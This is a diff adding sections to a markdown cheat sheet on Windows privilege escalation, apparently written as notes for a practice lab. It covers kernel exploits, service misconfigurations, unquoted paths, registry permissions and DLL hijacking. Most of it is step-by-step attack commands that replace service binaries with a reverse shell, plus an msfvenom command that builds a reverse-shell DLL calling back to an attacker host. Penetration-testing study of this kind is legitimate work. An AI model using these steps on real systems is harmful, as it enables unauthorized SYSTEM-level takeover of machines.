@@ -96,6 +96,7 @@
   - [accesschk](#accesschk)
 - [Privilege Escalation Techniques](#Privilege-Escalation-Techniques)
   - [Kernel Exploits](#Kernel-Exploits)
+    - [Services](#Services)
   - [Service Exploits](#Service-Exploits)
   - [Registry exploits](#Registry-exploits)
   - [passwords](#passwords)
@@ -1473,8 +1474,353 @@ option.
 ## Privilege Escalation Techniques
 
 ### Kernel Exploits
+#### What is a Kernel?
+Kernels are the core of any operating system.
+Think of it as a layer between application software and the
+actual computer hardware.
+
+The kernel has complete control over the operating system.
+Exploiting a kernel vulnerability can result in execution as the
+SYSTEM user.
+
+#### Finding Kernel Exploits
+
+Finding and using kernel exploits is usually a simple process:
+
+1. Enumerate Windows version / patch level (systeminfo).
+2. Find matching exploits (Google, ExploitDB, GitHub).
+3. Compile and run.
+
+Beware though, as Kernel exploits can often be unstable and
+may be one-shot or cause a system crash.
+
+
+Tools
+Windows Exploit Suggester:
+```
+https://github.com/bitsadmin/wesng
+```
+
+Precompiled Kernel Exploits:
+```
+https://github.com/SecWiki/windows-kernel-exploits
+```
+Watson:
+```
+https://github.com/rasta-mouse/Watson
+```
+
+### Privilege Escalation
+
+(Note: These steps are for Windows 7)
+1.Extract the output of the systeminfo command:
+```
+> systeminfo > systeminfo.txt
+```
+2.Run wesng to find potential exploits:
+```
+# python wes.py systeminfo.txt -i 'Elevation
+of Privilege' --exploits-only | less
+```
+3.Cross-reference results with compiled exploits:
+https://github.com/SecWiki/windows-kernel-exploits
+
+4.Download the compiled exploit for <whatever CVE or exploit it found> but for this demo we use the CVE-2018-8210 and put it onto the Windows VM:
+```
+https://github.com/SecWiki/windows-
+kernel-exploits/blob/master/CVE-2018-8120/x64.exe
+```
+
+5.Start a listener on Kali and run the exploit, providing it
+with the reverse shell executable, which should run with
+SYSTEM privileges:
+```
+> .\x64.exe C:\PrivEsc\reverse.exe
+```
 
 ### Service Exploits
+
+Services are simply programs that run in the
+background, accepting input or performing regular
+tasks.
+
+If services run with SYSTEM privileges and are
+misconfigured, exploiting them may lead to command
+execution with SYSTEM privileges as well.
+
+the following commands are usefull when dealing with services.
+
+Service Commands
+Query the configuration of a service:
+``´
+> sc.exe qc <name>
+```
+Query the current status of a service:
+```
+> sc.exe query <name>
+```
+Modify a configuration option of a service:
+```
+> sc.exe config <name> <option>= <value>
+```
+Start/Stop a service:
+```
+> net start/stop <name>
+```
+
+
+Service Misconfigurations:
+1. Insecure Service Properties
+2. Unquoted Service Path
+3. Weak Registry Permissions
+4. Insecure Service Executables
+5. DLL Hijacking
+
+
+### Insecure Service Permissions
+
+Each service has an ACL which defines certain service-specific
+permissions.
+
+Some permissions are innocuous (e.g. SERVICE_QUERY_CONFIG,
+SERVICE_QUERY_STATUS).
+
+Some may be useful (e.g. SERVICE_STOP, SERVICE_START).
+
+Some are dangerous (e.g. SERVICE_CHANGE_CONFIG,
+SERVICE_ALL_ACCESS)
+
+
+#### Insecure Service Permissions
+
+If our user has permission to change the configuration of a
+service which runs with SYSTEM privileges, we can change
+the executable the service uses to one of our own.
+
+Potential Rabbit Hole: If you can change a service
+configuration but cannot stop/start the service, you may not
+be able to escalate privileges!
+
+Privilege Escalation
+example:
+1.Run winPEAS to check for service misconfigurations:
+```
+> .\winPEASany.exe quiet servicesinfo
+```
+2.Note that we can modify the “daclsvc” service.
+
+3.We can confirm this with accesschk.exe:
+```
+> .\accesschk.exe /accepteula -uwcqv user daclsvc
+```
+4.Check the current configuration of the service:
+```
+> sc qc daclsvc
+```
+
+5.Check the current status of the service:
+```
+> sc query daclsvc
+```
+6.Reconfigure the service to use our reverse shell executable:
+```
+> sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+```
+7.Start a listener on Kali, and then start the service to trigger the
+exploit:
+```
+> net start daclsvc
+```
+
+#### Unquoted Service Path
+Executables in Windows can be run without using their
+extension (e.g. “whoami.exe” can be run by just typing
+“whoami”).
+
+Some executables take arguments, separated by spaces, e.g.
+someprog.exe arg1 arg2 arg3...
+
+This behavior leads to ambiguity when using absolute paths
+that are unquoted and contain spaces.
+
+
+Consider the following unquoted path:
+C:\Program Files\Some Dir\SomeProgram.exe
+
+To us, this obviously runs SomeProgram.exe. To Windows, C:\Program could be
+the executable, with two arguments: “Files\Some” and “Dir\ SomeProgram.exe”
+
+Windows resolves this ambiguity by checking each of the possibilities in turn.
+
+If we can write to a location Windows checks before the actual executable, we
+can trick the service into executing it instead.
+
+
+#### Privilege Escalation
+
+1.Run winPEAS to check for service misconfigurations:
+```
+> .\winPEASany.exe quiet servicesinfo
+```
+2.Note that the “unquotedsvc” service has an unquoted path that
+also contains spaces:
+```
+C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+```
+3.Confirm this using sc:
+```
+> sc qc unquotedsvc
+```
+
+
+4.Use accesschk.exe to check for write permissions:
+```
+> .\accesschk.exe /accepteula -uwdq C:\
+```
+```
+> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
+```
+```
+> .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+```
+5.Copy the reverse shell executable and rename it appropriately:
+```
+> copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+```
+6.Start a listener on Kali, and then start the service to trigger the exploit:
+```
+> net start unquotedsvc
+```
+
+####Weak Registry Permissions
+
+The Windows registry stores entries for each service.
+Since registry entries can have ACLs, if the ACL is
+misconfigured, it may be possible to modify a service’s
+configuration even if we cannot modify the service
+directly.
+
+Privilege Escalation
+
+1.Run winPEAS to check for service misconfigurations:
+```
+> .\winPEASany.exe quiet servicesinfo
+```
+2.Note that the “regsvc” service has a weak registry entry. We can confirm this with
+PowerShell:
+```
+PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
+```
+
+3.Alternatively accesschk.exe can be used to confirm:
+```
+> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+```
+
+#### Insecure Service Executables
+
+If the original service executable is modifiable by our
+user, we can simply replace it with our reverse shell
+executable.
+
+Remember to create a backup of the original executable
+if you are exploiting this in a real system!
+
+#### Privilege Escalation
+
+1.Run winPEAS to check for service misconfigurations:
+```
+> .\winPEASany.exe quiet servicesinfo
+```
+2.Note that the “filepermsvc” service has an executable which appears to be
+
+writable by everyone. We can confirm this with accesschk.exe:
+```
+> .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+```
+3.Create a backup of the original service executable:
+```
+> copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
+```
+4.Copy the reverse shell executable to overwrite the service
+executable:
+```
+> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+```
+5.Start a listener on Kali, and then start the service to trigger the
+exploit:
+```
+> net start filepermsvc
+```
+
+#### DLL Hijacking
+
+Often a service will try to load functionality from a library
+called a DLL (dynamic-link library). Whatever functionality the
+DLL provides, will be executed with the same privileges as the
+service that loaded it.
+
+If a DLL is loaded with an absolute path, it might be possible
+to escalate privileges if that DLL is writable by our user.
+
+
+A more common misconfiguration that can be used to
+escalate privileges is if a DLL is missing from the system,
+and our user has write access to a directory within the
+PATH that Windows searches for DLLs in.
+
+Unfortunately, initial detection of vulnerable services is
+difficult, and often the entire process is very manual.
+
+#### Privilege Escalation
+
+1.Use winPEAS to enumerate non-Windows services:
+```
+> .\winPEASany.exe quiet servicesinfo
+```
+2.Note that the C:\Temp directory is writable and in the PATH. Start by
+enumerating which of these services our user has stop and start access to:
+```
+> .\accesschk.exe /accepteula -uvqc user dllsvc
+```
+3.The “dllsvc” service is vulnerable to DLL Hijacking. According to the
+winPEAS output, the service runs the dllhijackservice.exe executable. We
+can confirm this manually:
+```
+> sc qc dllsvc
+```
+4.Run Procmon64.exe with administrator privileges. Press
+Ctrl+L to open the Filter menu.
+
+5.Add a new filter on the Process Name matching
+dllhijackservice.exe.
+
+6.On the main screen, deselect registry activity and
+network activity.
+
+7.Start the service:
+```
+> net start dllsvc
+```
+8.Back in Procmon, note that a number of “NAME NOT
+FOUND” errors appear, associated with the hijackme.dll file.
+
+9.At some point, Windows tries to find the file in the C:\Temp
+directory, which as we found earlier, is writable by our user.
+
+10. On Kali, generate a reverse shell DLL named hijackme.dll:
+```
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o hijackme.dll
+```
+11. Copy the DLL to the Windows VM and into the C:\Temp directory. Start a
+listener on Kali and then stop/start the service to trigger the exploit:
+```
+> net stop dllsvc
+```
+```
+> net start dllsvc
+```
+
 
 ### Registry exploits
 
@@ -1579,6 +1925,16 @@ To use the script, you will need to run the systeminfo command on the target sys
 Once this is done, wes.py can be run as follows;
 ```
 wes.py systeminfo.txt
+```
+or like this
+```
+# python wes.py systeminfo.txt -i 'Elevation
+of Privilege' --exploits-only | less
+```
+same but if you have it installed do this and you have it on the same folder shared over smb you can do this in your own kali machin
+```
+# wes systeminfo.txt -i 'Elevation
+of Privilege' --exploits-only | less
 ```
 
 
